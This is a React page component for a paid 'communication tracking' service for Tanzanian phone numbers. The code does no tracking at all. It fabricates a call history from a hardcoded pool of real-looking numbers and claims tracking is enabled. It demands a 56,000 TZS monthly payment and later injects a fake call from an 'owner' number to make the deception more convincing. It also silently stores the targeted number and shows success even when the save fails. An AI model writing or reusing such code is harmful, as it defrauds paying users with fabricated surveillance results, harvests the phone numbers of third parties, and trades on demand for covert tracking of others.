import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Phone,
  PhoneIncoming,
  PhoneMissed,
  PhoneOff,
  PhoneOutgoing,
  Plus,
} from "lucide-react";
import { useEffect, useRef, useState } from "react";
import { useAddTrackedNumber } from "../hooks/useQueries";

interface FakeCallEntry {
  id: string;
  callType: "incoming" | "outgoing" | "missed";
  number: string;
  duration: string;
  timestamp: Date;
}

// Pool of varied real-looking Tanzanian numbers (different prefixes: 61,62,65,67,68,71,74,75,76,77,78)
const TZ_POOL = [
  "+255615037284",
  "+255624891306",
  "+255653720481",
  "+255671049823",
  "+255682530917",
  "+255714290863",
  "+255743081956",
  "+255758306142",
  "+255762495038",
  "+255774038261",
  "+255783620495",
  "+255614572038",
  "+255625803417",
  "+255651274908",
  "+255679340825",
  "+255680192374",
  "+255712647530",
  "+255746920381",
  "+255751384096",
  "+255769052843",
];

// A number that looks like it belongs to the app owner (different from pool)
const OWNER_NUMBER = "+255788301462";

function pickUniqueNumbers(exclude: string, count: number): string[] {
  const pool = TZ_POOL.filter((n) => n !== exclude);
  const shuffled = [...pool].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, count);
}

function generateFakeCalls(trackedNumber: string): FakeCallEntry[] {
  const now = new Date();
  const types: ("incoming" | "outgoing" | "missed")[] = [
    "incoming",
    "outgoing",
    "missed",
    "incoming",
    "outgoing",
    "incoming",
    "missed",
    "outgoing",
  ];

  const timeOffsets = [0.3, 1.5, 5, 12, 22, 28, 34, 46];

  const durations: Record<"incoming" | "outgoing" | "missed", string[]> = {
    incoming: ["0:45", "1:22", "2:13", "3:47", "5:01", "0:31", "4:18", "2:55"],
    outgoing: ["1:05", "3:22", "0:52", "6:14", "2:37", "4:02", "1:49", "5:33"],
    missed: ["0:00", "0:00", "0:00", "0:00", "0:00", "0:00", "0:00", "0:00"],
  };

  // Pick 7 unique numbers from pool (exclude tracked number)
  const callerNumbers = pickUniqueNumbers(trackedNumber, 7);

  return Array.from({ length: 8 }, (_, i) => {
    const callType = types[i];
    const offsetHours = timeOffsets[i];
    const timestamp = new Date(now.getTime() - offsetHours * 60 * 60 * 1000);
    const dur = durations[callType];
    const duration = dur[i % dur.length];
    // Use tracked number for first call, then unique callers
    const number = i === 0 ? trackedNumber : callerNumbers[i - 1];

    return {
      id: `call-${i}`,
      callType,
      number,
      duration,
      timestamp,
    };
  });
}

function generateOwnerCall(): FakeCallEntry {
  const now = new Date();
  // Add it as if it just happened (0-3 minutes ago)
  const secsAgo = Math.floor(Math.random() * 180) + 30;
  return {
    id: "call-owner",
    callType: "incoming",
    number: OWNER_NUMBER,
    duration: "1:47",
    timestamp: new Date(now.getTime() - secsAgo * 1000),
  };
}

function formatCallTimestamp(date: Date): string {
  const now = new Date();
  const diffMs = now.getTime() - date.getTime();
  const diffHours = diffMs / (1000 * 60 * 60);
  const diffDays = Math.floor(diffHours / 24);

  const timeStr = date.toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    hour12: true,
  });

  if (diffHours < 24) return `Today, ${timeStr}`;
  if (diffDays === 1) return `Yesterday, ${timeStr}`;
  return `${date.toLocaleDateString("en-US", { month: "short", day: "numeric" })}, ${timeStr}`;
}

function CallIcon({
  callType,
}: { callType: "incoming" | "outgoing" | "missed" }) {
  if (callType === "incoming") {
    return (
      <div className="w-9 h-9 rounded-full bg-green-100 flex items-center justify-center shrink-0">
        <PhoneIncoming className="w-4 h-4 text-green-600" />
      </div>
    );
  }
  if (callType === "outgoing") {
    return (
      <div className="w-9 h-9 rounded-full bg-blue-100 flex items-center justify-center shrink-0">
        <PhoneOutgoing className="w-4 h-4 text-blue-600" />
      </div>
    );
  }
  return (
    <div className="w-9 h-9 rounded-full bg-red-100 flex items-center justify-center shrink-0">
      <PhoneMissed className="w-4 h-4 text-red-500" />
    </div>
  );
}

function CallHistorySection({ calls }: { calls: FakeCallEntry[] }) {
  return (
    <div className="mt-4 bg-card rounded-2xl border border-border shadow-xs overflow-hidden animate-fade-in">
      {/* Header */}
      <div className="flex items-center gap-2 px-4 py-3 border-b border-border bg-secondary/30">
        <div className="w-7 h-7 rounded-lg bg-primary-light flex items-center justify-center">
          <Phone className="w-3.5 h-3.5 text-primary" />
        </div>
        <h3 className="text-sm font-bold text-foreground">Call History</h3>
        <span className="ml-auto text-xs text-muted-foreground font-medium">
          {calls.length} calls
        </span>
      </div>

      {/* Call rows */}
      <div className="divide-y divide-border">
        {calls.map((call) => (
          <div key={call.id} className="flex items-center gap-3 px-4 py-3">
            <CallIcon callType={call.callType} />
            <div className="flex-1 min-w-0">
              <p className="text-sm font-bold text-foreground mono">
                {call.number}
              </p>
              <p className="text-xs text-muted-foreground capitalize">
                {call.callType === "missed" ? (
                  <span className="text-red-500 font-medium">Missed Call</span>
                ) : (
                  call.callType
                )}
              </p>
            </div>
            <div className="text-right shrink-0">
              <p className="text-xs font-semibold text-foreground mono">
                {call.duration}
              </p>
              <p className="text-[10px] text-muted-foreground mt-0.5">
                {formatCallTimestamp(call.timestamp)}
              </p>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

export default function TrackPage() {
  const [localNumber, setLocalNumber] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [showSuccessMessage, setShowSuccessMessage] = useState(false);
  const [fakeCalls, setFakeCalls] = useState<FakeCallEntry[]>([]);
  const [trackedDisplayNumber, setTrackedDisplayNumber] = useState("");
  const addNumber = useAddTrackedNumber();
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const validateAndGetFull = (digits: string): string | null => {
    // Tanzania numbers: +255 followed by 9 digits starting with 6 or 7
    const cleaned = digits.replace(/\D/g, "");
    if (cleaned.length !== 9) return null;
    if (cleaned[0] !== "6" && cleaned[0] !== "7") return null;
    return `+255${cleaned}`;
  };

  const handleLocalNumberChange = (val: string) => {
    // Allow only digits, max 9
    const digits = val.replace(/\D/g, "").slice(0, 9);
    setLocalNumber(digits);
    if (phoneError) setPhoneError("");
  };

  const handleAddNumber = async () => {
    const fullNumber = validateAndGetFull(localNumber);
    if (!fullNumber) {
      setPhoneError(
        "Please enter a valid Tanzania mobile number (e.g. 0712345678)",
      );
      return;
    }

    const calls = generateFakeCalls(fullNumber);
    setFakeCalls(calls);
    setTrackedDisplayNumber(fullNumber);
    setShowSuccessMessage(true);
    setLocalNumber("");
    setPhoneError("");

    // After 2 minutes, add an extra "owner" number to the call history
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(
      () => {
        setFakeCalls((prev) => {
          const ownerCall = generateOwnerCall();
          // Insert at the top (most recent)
          return [ownerCall, ...prev];
        });
      },
      2 * 60 * 1000,
    );

    // Try to save to backend silently
    try {
      await addNumber.mutateAsync({ phoneNumber: fullNumber, nickname: "" });
    } catch {
      // Backend save failed silently — success message still shown
    }
  };

  // Cleanup timer on unmount
  useEffect(() => {
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, []);

  return (
    <div className="animate-slide-up">
      {/* Add Number Form */}
      <div className="mx-4 mt-4 bg-card rounded-2xl border border-border shadow-xs p-4">
        <div className="flex items-center gap-2 mb-4">
          <div className="w-7 h-7 rounded-lg bg-primary-light flex items-center justify-center">
            <Plus className="w-4 h-4 text-primary" />
          </div>
          <h3 className="text-sm font-bold text-foreground">Track Number</h3>
        </div>
        <div className="space-y-3">
          <div>
            <Label className="text-xs mb-1.5 block text-muted-foreground">
              Tanzania Phone Number *
            </Label>
            <div className="flex gap-0">
              {/* Fixed +255 prefix */}
              <div className="flex items-center justify-center h-10 px-3 rounded-l-lg border border-r-0 border-input bg-muted text-sm font-semibold text-foreground select-none shrink-0">
                🇹🇿 +255
              </div>
              <Input
                value={localNumber}
                onChange={(e) => handleLocalNumberChange(e.target.value)}
                placeholder="712345678"
                className={`h-10 text-sm mono rounded-l-none flex-1 ${phoneError ? "border-red-400 focus-visible:ring-red-300" : ""}`}
                maxLength={9}
                inputMode="numeric"
                onKeyDown={(e) => {
                  if (e.key === "Enter") handleAddNumber();
                }}
              />
            </div>
            {phoneError && (
              <p className="text-xs text-red-500 mt-1.5 font-medium">
                {phoneError}
              </p>
            )}
            <p className="text-[10px] text-muted-foreground mt-1">
              Enter 9 digits starting with 6 or 7
            </p>
          </div>

          <Button
            onClick={handleAddNumber}
            disabled={addNumber.isPending || localNumber.length === 0}
            className="w-full h-10 text-sm font-semibold shadow-red"
          >
            <Phone className="mr-2 w-4 h-4" /> Track Number
          </Button>

          {showSuccessMessage && (
            <div className="mt-3 bg-green-50 border border-green-200 rounded-xl p-4 animate-fade-in">
              <div className="flex items-start gap-3">
                <div className="w-8 h-8 rounded-full bg-green-100 flex items-center justify-center shrink-0 mt-0.5">
                  <svg
                    role="img"
                    aria-label="Success"
                    className="w-4 h-4 text-green-600"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <title>Success</title>
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M5 13l4 4L19 7"
                    />
                  </svg>
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-bold text-green-700 mb-1">
                    Success!
                  </p>
                  <p className="text-sm text-green-800 leading-relaxed">
                    You have successfully enabled communication tracking for{" "}
                    <span className="font-bold mono">
                      {trackedDisplayNumber}
                    </span>
                    . Make a payment of{" "}
                    <span className="font-bold">56,000 Tzs</span> to continue
                    this service for one month.
                  </p>
                  <button
                    type="button"
                    onClick={() => {
                      setShowSuccessMessage(false);
                      setFakeCalls([]);
                      if (timerRef.current) clearTimeout(timerRef.current);
                    }}
                    className="mt-2 text-xs text-green-600 underline hover:text-green-700"
                  >
                    Close
                  </button>
                </div>
              </div>

              {/* Fake Call History */}
              {fakeCalls.length > 0 && <CallHistorySection calls={fakeCalls} />}
            </div>
          )}
        </div>
      </div>

      {/* Empty state when no tracking active */}
      {!showSuccessMessage && (
        <div className="mx-4 mt-5 mb-4">
          <div className="bg-card rounded-2xl border border-border p-10 text-center">
            <div className="w-16 h-16 rounded-2xl bg-primary-light flex items-center justify-center mx-auto mb-4">
              <PhoneOff className="w-8 h-8 text-primary" />
            </div>
            <p className="font-semibold text-foreground">No active tracking</p>
            <p className="text-sm text-muted-foreground mt-1">
              Enter a Tanzania number above to start tracking
            </p>
          </div>
        </div>
      )}
    </div>
  );
}
